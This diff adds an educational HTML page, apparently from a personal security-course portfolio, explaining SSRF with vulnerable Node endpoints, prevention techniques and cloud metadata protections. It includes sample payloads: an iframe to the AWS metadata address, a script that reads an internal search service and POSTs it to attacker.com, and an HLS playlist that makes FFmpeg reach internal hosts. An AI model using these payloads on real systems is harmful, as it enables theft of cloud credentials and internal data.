@@ -1,0 +1,578 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Server-Side Request Forgery (SSRF) - JavaScript Security</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css">
+    <style>
+        /* Usando o mesmo estilo do csrf-demo.html */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            line-height: 1.6;
+            color: #333;
+               background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            background: linear-gradient(to right, #2c3e50, #4a6491);
+            color: white;
+            padding: 2rem;
+            border-radius: 10px;
+            margin-bottom: 2rem;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 0.5rem;
+        }
+        
+        .subtitle {
+            font-size: 1.2rem;
+            opacity: 0.9;
+            margin-bottom: 1.5rem;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 1rem;
+        }
+        
+        .logo-img {
+            width: 40px;
+            height: 40px;
+            background: white;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            color: #2c3e50;
+        }
+        
+        .content-grid {
+            display: grid;
+            gap: 2rem;
+            margin-bottom: 2rem;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 10px;
+            padding: 1.5rem;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05);
+            transition: transform 0.3s ease;
+        }
+        
+        .card:hover {
+            transform: translateY(-5px);
+        }
+        
+        .card-title {
+            color: #2c3e50;
+            margin-bottom: 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 2px solid #4a6491;
+        }
+        
+        .code-block {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            border-radius: 5px;
+            padding: 1rem;
+            overflow-x: auto;
+            margin: 1rem 0;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            color: #856404;
+            padding: 1rem;
+            border-radius: 5px;
+            margin: 1rem 0;
+        }
+        
+        .danger {
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
+            padding: 1rem;
+            border-radius: 5px;
+            margin: 1rem 0;
+        }
+        
+        .info {
+            background: #d1ecf1;
+            border: 1px solid #bee5eb;
+            color: #0c5460;
+            padding: 1rem;
+            border-radius: 5px;
+            margin: 1rem 0;
+        }
+        
+        .step-list {
+            margin-left: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+        
+        .step-list li {
+            margin-bottom: 0.5rem;
+        }
+        
+        .comparison-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1.5rem 0;
+            background: white;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+        }
+        
+        .comparison-table th {
+            background: #4a6491;
+            color: white;
+            padding: 1rem;
+            text-align: left;
+            font-weight: 600;
+        }
+        
+        .comparison-table td {
+            padding: 1rem;
+            border-bottom: 1px solid #dee2e6;
+        }
+        
+        .comparison-table tr:last-child td {
+            border-bottom: none;
+        }
+        
+        .attack-flow {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 2rem 0;
+            flex-wrap: wrap;
+            gap: 1rem;
+        }
+        
+        .flow-step {
+            background: white;
+            padding: 1rem;
+            border-radius: 8px;
+            box-shadow: 0 3px 5px rgba(0,0,0,0.1);
+            text-align: center;
+            width: 180px;
+            position: relative;
+        }
+        
+        .flow-step:not(:last-child)::after {
+            content: "→";
+            position: absolute;
+            right: -25px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 1.5rem;
+            color: #6c757d;
+        }
+        
+        @media (max-width: 768px) {
+            .flow-step:not(:last-child)::after {
+                content: "↓";
+                right: 50%;
+                top: auto;
+                bottom: -25px;
+                transform: translateX(50%);
+            }
+            
+            .attack-flow {
+                flex-direction: column;
+            }
+            
+            .flow-step {
+                width: 100%;
+            }
+        }
+        
+        .prevention-methods {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1.5rem;
+            margin-top: 2rem;
+        }
+        
+        .prevention-card {
+            background: #e8f5e9;
+            padding: 1.5rem;
+            border-radius: 8px;
+            border: 1px solid #c8e6c9;
+        }
+        
+        .prevention-card h4 {
+            color: #2e7d32;
+            margin-bottom: 0.75rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 3rem;
+            padding-top: 2rem;
+            border-top: 1px solid #dee2e6;
+            color: #6c757d;
+            font-size: 0.9rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>            
+            <h1>Server-Side Request Forgery (SSRF)</h1>
+            <p class="subtitle">Understanding and preventing internal network attacks from external sources</p>
+        </header>
+        
+        <div class="content-grid">
+            <div class="card">
+                <h2 class="card-title">What is SSRF?</h2>
+                <p>Server-Side Request Forgery (SSRF) is a vulnerability that allows attackers to make the server send requests to arbitrary URLs. This is particularly dangerous in cloud environments because:</p>
+                
+                <ul class="step-list">
+                    <li>Servers often have access to internal services that aren't publicly accessible</li>
+                    <li>Internal services typically have minimal security (trusted zone assumption)</li>
+                    <li>Network firewalls don't protect against requests coming from within the network</li>
+                </ul>
+                
+                <div class="danger">
+                    <strong>Critical Risk:</strong> SSRF can lead to data exfiltration, internal service enumeration, and in cloud environments, access to metadata services that contain credentials.
+                </div>
+            </div>
+            
+            <div class="card">
+                <h2 class="card-title">How SSRF Works - Attack Flow</h2>
+                
+                <div class="attack-flow">
+                    <div class="flow-step">
+                        <strong>Step 1</strong>
+                        <p>Attacker sends malicious request to vulnerable endpoint</p>
+                    </div>
+                    <div class="flow-step">
+                        <strong>Step 2</strong>
+                        <p>Server processes request and makes internal network call</p>
+                    </div>
+                    <div class="flow-step">
+                        <strong>Step 3</strong>
+                        <p>Internal service responds (metadata, databases, etc.)</p>
+                    </div>
+                    <div class="flow-step">
+                        <strong>Step 4</strong>
+                        <p>Server returns internal data to attacker</p>
+                    </div>
+                </div>
+                
+                <div class="warning">
+                    <strong>Note:</strong> Cloud metadata services (like AWS IMDS at 169.254.169.254) are common SSRF targets that can leak cloud credentials.
+                </div>
+            </div>
+            
+            <div class="card">
+                <h2 class="card-title">Example Vulnerability</h2>
+                <p>Consider a document conversion service that converts HTML to PDF:</p>
+                
+                <div class="code-block">
+// Vulnerable PDF conversion endpoint
+app.post('/convert', async (req, res) => {
+  const { html } = req.body;
+
+  // Use Puppeteer to render HTML and export as PDF
+  const browser = await puppeteer.launch();
+  const page = await browser.newPage();
+  await page.setContent(html);  // VULNERABLE: No URL filtering
+  const pdf = await page.pdf();
+
+  res.type('application/pdf').send(pdf);
+});
+                </div>
+                
+                <p>The HTML could include iframes or resources that load sensitive internal information:</p>
+                
+                <div class="code-block">
+<!-- Malicious HTML payload -->
+&lt;iframe src="http://169.254.169.254/latest/meta-data/"&gt;&lt;/iframe&gt;
+&lt;img src="http://internal-database:8080/admin/users" /&gt;
+&lt;script&gt;
+  // JavaScript to fetch internal services
+  fetch('http://localhost:9200/_search?q=*')
+    .then(res => res.text())
+    .then(data => {
+      // Send data to attacker server
+      fetch('https://attacker.com/steal', {
+        method: 'POST',
+        body: data
+      });
+    });
+&lt;/script&gt;
+                </div>
+            </div>
+            
+            <div class="card">
+                <h2 class="card-title">SSRF Attack Vectors</h2>
+                
+                <div class="info">
+                    <strong>SSRF is often hidden in unexpected features:</strong>
+                </div>
+                
+                <h3 style="margin-top: 1.5rem; color: #2c3e50;">1. Open Link Redirection</h3>
+                <p>Analytics or authentication redirects without validation:</p>
+                
+                <div class="code-block">
+// Vulnerable redirect endpoint
+app.get('/redirect', (req, res) => {
+  const target = req.query.url;
+  res.redirect(target);  // VULNERABLE: No validation
+});
+
+// Attacker exploits with:
+// GET /redirect?url=http://169.254.169.254/latest/meta-data/
+                </div>
+                
+                <h3 style="margin-top: 1.5rem; color: #2c3e50;">2. Video Processing (FFmpeg)</h3>
+                <p>Malicious HLS playlist causing FFmpeg to make internal requests:</p>
+                
+                <div class="code-block">
+#EXTM3U
+#EXT-X-MEDIA-SEQUENCE:0
+#EXTINF:10.0,
+http://internal.com/sensitive-data
+#EXT-X-ENDLIST
+                </div>
+                
+                <h3 style="margin-top: 1.5rem; color: #2c3e50;">3. File Upload Processing</h3>
+                <p>File parsers fetching external resources (XML, SVG, PDF, etc.)</p>
+            </div>
+            
+            <div class="card">
+                <h2 class="card-title">Real-World Examples</h2>
+                
+                <table class="comparison-table">
+                    <thead>
+                        <tr>
+                            <th>Service</th>
+                            <th>Vulnerability</th>
+                            <th>Impact</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><strong>Grafana</strong></td>
+                            <td>Avatar endpoint SSRF through Gravatar redirects</td>
+                            <td>Full internal network access</td>
+                        </tr>
+                        <tr>
+                            <td><strong>TikTok</strong></td>
+                            <td>Video upload processing with FFmpeg HLS</td>
+                            <td>Internal service enumeration</td>
+                        </tr>
+                        <tr>
+                            <td><strong>AWS EC2</strong></td>
+                            <td>Metadata service exposed via SSRF</td>
+                            <td>Cloud credentials theft</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Shopify</strong></td>
+                            <td>Webhook configuration SSRF</td>
+                            <td>Internal network scanning</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+            
+            <div class="card">
+                <h2 class="card-title">SSRF Prevention Techniques</h2>
+                
+                <div class="prevention-methods">
+                    <div class="prevention-card">
+                        <h4>1. Input Validation & Sanitization</h4>
+                        <ul>
+                            <li>Validate URLs against allowed domains/patterns</li>
+                            <li>Use allowlists instead of blocklists</li>
+                            <li>Parse URLs with <code>new URL()</code> instead of string concatenation</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="prevention-card">
+                        <h4>2. Network-Level Controls</h4>
+                        <ul>
+                            <li>Disable URL redirection: <code>fetch(url, {redirect: 'error'})</code></li>
+                            <li>Use outbound proxy with filtering</li>
+                            <li>Implement network segmentation</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="prevention-card">
+                        <h4>3. Service Isolation</h4>
+                        <ul>
+                            <li>Run third-party tools in isolated containers</li>
+                            <li>No sensitive files in processing containers</li>
+                            <li>Restricted network access policies</li>
+                        </ul>
+                    </div>
+                    
+                    <div class="prevention-card">
+                        <h4>4. Authentication & Monitoring</h4>
+                        <ul>
+                            <li>Require authentication for internal services</li>
+                            <li>Log all outbound requests</li>
+                            <li>Monitor for unusual request patterns</li>
+                        </ul>
+                    </div>
+                </div>
+                
+                <div class="code-block" style="margin-top: 1.5rem;">
+// Safe URL validation example
+function validateUrl(inputUrl) {
+  try {
+    const url = new URL(inputUrl);
+    
+    // Allowlist of permitted domains
+    const allowedDomains = ['example.com', 'cdn.example.com'];
+    const isAllowed = allowedDomains.some(domain => 
+      url.hostname === domain || url.hostname.endsWith('.' + domain)
+    );
+    
+    // Block internal/reserved IPs
+    const isInternal = url.hostname === 'localhost' ||
+                      url.hostname === '127.0.0.1' ||
+                      url.hostname.startsWith('192.168.') ||
+                      url.hostname.startsWith('10.') ||
+                      url.hostname.startsWith('169.254.');
+    
+    return isAllowed && !isInternal;
+  } catch {
+    return false;
+  }
+}
+
+// Safe fetch with restrictions
+async function safeFetch(url) {
+  if (!validateUrl(url)) {
+    throw new Error('URL not allowed');
+  }
+  
+  return fetch(url, {
+    redirect: 'error',  // Disable redirects
+    timeout: 5000       // Request timeout
+  });
+}
+                </div>
+            </div>
+            
+            <div class="card">
+                <h2 class="card-title">Cloud-Specific SSRF Protection</h2>
+                
+                <table class="comparison-table">
+                    <thead>
+                        <tr>
+                            <th>Cloud Provider</th>
+                            <th>Metadata Service</th>
+                            <th>Protection</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr>
+                            <td><strong>AWS</strong></td>
+                            <td>169.254.169.254 (IMDS v1/v2)</td>
+                            <td>Use IMDSv2, disable metadata service if unused</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Azure</strong></td>
+                            <td>169.254.169.254 (IMDS)</td>
+                            <td>Managed Identity instead of service principals</td>
+                        </tr>
+                        <tr>
+                            <td><strong>GCP</strong></td>
+                            <td>metadata.google.internal</td>
+                            <td>Use workload identity federation</td>
+                        </tr>
+                        <tr>
+                            <td><strong>Kubernetes</strong></td>
+                            <td>Kubernetes API server</td>
+                            <td>Restrict pod service accounts</td>
+                        </tr>
+                    </tbody>
+                </table>
+                
+                <div class="info" style="margin-top: 1.5rem;">
+                    <strong>Recommendation:</strong> Always use the latest version of cloud metadata services (IMDSv2 for AWS) which requires session tokens.
+                </div>
+            </div>
+        </div>
+        
+                <footer>
+                <!-- Primeira linha: Referência ao curso -->
+                <p style="margin-bottom: 0.5rem;">
+                    <strong>Based on "Introduction to JavaScript Security (LFS184)" by The Linux Foundation</strong>
+                </p>
+                
+                <!-- Segunda linha: Informações de licença e autoria -->
+                <p style="margin-bottom: 1rem; font-size: 0.95rem;">
+                    Security education reference • Created for learning and demonstration purposes • Licensed under 
+                    <a href="https://creativecommons.org/licenses/by-sa/4.0/" 
+                    target="_blank" 
+                    style="color: #4a6491; text-decoration: none; font-weight: 600;">
+                        CC-BY-SA-4.0
+                    </a>
+                </p>
+                
+                <!-- Terceira linha: Informações pessoais -->
+                <div style="display: flex; justify-content: center; align-items: center; gap: 1rem; margin-bottom: 1rem; flex-wrap: wrap;">
+                    <span style="color: #4a6491; font-weight: 600;">© Iure Castro</span>
+                    <span style="color: #666;">•</span>
+                    <span>Personal learning portfolio</span>
+                    <span style="color: #666;">•</span>
+                    <span>All examples for educational use</span>
+                </div>
+                
+                <!-- Quarta linha: Links úteis -->
+                <div style="display: flex; justify-content: center; gap: 1.5rem; margin: 1rem 0; flex-wrap: wrap;">
+                    <a href="https://training.linuxfoundation.org/training/introduction-to-javascript-security-lfs184/" 
+                    target="_blank"
+                    style="color: #4a6491; text-decoration: none; font-size: 0.9rem;">
+                        🔗 Original Course
+                    </a>
+                    <a href="https://creativecommons.org/licenses/by-sa/4.0/" 
+                    target="_blank"
+                    style="color: #4a6491; text-decoration: none; font-size: 0.9rem;">
+                        📄 CC-BY-SA-4.0 License
+                    </a>
+                    <a href="certificate.pdf" 
+                    target="_blank"
+                    style="color: #4a6491; text-decoration: none; font-size: 0.9rem;">
+                        🏆 My Certificate
+                    </a>
+                </div>
+        </footer>
+
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+</body>
+</html>
